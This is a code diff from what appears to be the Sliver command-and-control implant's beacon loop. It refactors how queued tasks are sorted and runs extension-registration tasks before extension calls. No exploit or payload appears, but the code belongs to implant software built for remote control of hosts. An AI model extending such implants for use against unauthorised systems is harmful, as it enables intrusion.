@@ -394,45 +394,30 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 		return nil
 	}
 
-	var tasksExtRegister []*sliverpb.Envelope
-	var tasksExtCall []*sliverpb.Envelope
-	var tasksRest []*sliverpb.Envelope
+	var tasksExtensionRegister []*sliverpb.Envelope
+	var tasksExtensionCall []*sliverpb.Envelope
+	var tasksOther []*sliverpb.Envelope
 
 	for _, task := range tasks.Tasks {
 		switch task.Type {
 		case sliverpb.MsgRegisterExtensionReq:
-			tasksExtRegister = append(tasksExtRegister, task)
+			tasksExtensionRegister = append(tasksExtensionRegister, task)
 		case sliverpb.MsgCallExtensionReq:
-			tasksExtCall = append(tasksExtCall, task)
+			tasksExtensionCall = append(tasksExtensionCall, task)
 		default:
-			tasksRest = append(tasksRest, task)
+			tasksOther = append(tasksOther, task)
 		}
 	}
 
-	sysHandlers := handlers.GetSystemHandlers()
+	// execute task lists sequentially, ensure all extensions are registered before they are called
 	var results []*sliverpb.Envelope
-	for _, task := range tasksExtRegister {
-		if handler, ok := sysHandlers[task.Type]; ok {
-			data := task.Data
-			taskID := task.ID
-			handlers.WrapperHandler(handler, data, func(data []byte, err error) {
-				// {{if .Config.Debug}}
-				if err != nil {
-					log.Printf("[beacon] handler function returned an error: %s", err)
-				}
-				log.Printf("[beacon] task completed (id: %d)", taskID)
-				// {{end}}
-				results = append(results, &sliverpb.Envelope{
-					ID:   taskID,
-					Data: data,
-				})
-			})
-		}
-	}
-	for _, r := range beaconHandleTasklist(tasksExtCall) {
+	for _, r := range beaconHandleTasklist(tasksExtensionRegister) {
 		results = append(results, r)
 	}
-	for _, r := range beaconHandleTasklist(tasksRest) {
+	for _, r := range beaconHandleTasklist(tasksExtensionCall) {
+		results = append(results, r)
+	}
+	for _, r := range beaconHandleTasklist(tasksOther) {
 		results = append(results, r)
 	}
 
